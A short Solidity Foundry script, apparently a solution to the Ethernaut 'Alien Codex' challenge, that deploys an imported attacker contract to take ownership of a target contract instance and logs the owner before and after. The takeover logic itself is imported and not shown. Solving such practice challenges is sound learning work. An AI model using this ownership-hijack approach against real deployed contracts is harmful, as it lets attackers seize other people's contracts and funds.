// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {AlienDecodex} from "../src/19_AlienCodex.sol";

interface IAlienCodex {
    function owner() external returns (address);
}

contract PoC is Script {
    address private immutable alienCodex =
        0xE57dAB9816371BEcC0E4fA092eb7FBE7C39365a6; // Replace with your Alien Codex instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        console2.log("Current owner: ", IAlienCodex(alienCodex).owner());

        new AlienDecodex(alienCodex);
        address alienOwner = IAlienCodex(alienCodex).owner();

        console2.log("New owner: ", alienOwner);

        vm.stopBroadcast();
    }
}
